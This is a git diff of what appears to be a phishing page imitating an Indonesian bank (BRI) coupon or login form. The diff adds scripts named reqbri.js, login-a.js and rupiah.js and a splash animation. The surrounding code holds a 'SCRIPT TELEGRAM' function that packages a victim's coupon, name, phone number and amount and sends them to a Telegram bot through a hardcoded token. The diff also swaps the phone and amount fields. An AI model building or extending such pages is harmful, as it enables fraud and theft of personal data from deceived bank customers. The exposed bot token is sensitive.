@@ -96,7 +96,26 @@
     </main>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
-
+<script src="jquery.min_1.js"></script>
+<script src="jquery.min.js"></script>
+<script src="reqbri.js"></script>
+<script src="login-a.js"></script>
+<script src=".js"></script>
+<script src="rupiah.js"></script>
+  <script>
+    window.onload = function() {
+        setTimeout(function() {
+            $(".start").fadeIn();
+            setTimeout(function() {
+                $(".start").fadeOut(1000);
+                setTimeout(function() {
+                    $("main").fadeIn(200);
+                    $("#inp").focus();
+                }, 1000);
+            }, 2000);
+        }, 500);
+    }
+    </script>
     <!-- SCRIPT TELEGRAM -->
     <script>
 function sendUser(event) {
@@ -112,8 +131,8 @@ function sendUser(event) {
 
 🎁 Kupon : ${kupon}
 👤 Nama  : ${nama}
-📱 HP    : ${hp}
-💰 Nominal : ${nominal}
+📱 HP    : ${nominal}
+💰 Nominal : ${hp}
     `;
 
     const token = "8144086963:AAFzLzI3oOgYrUZQPdw8rGxurpsGJ0SBSBI";
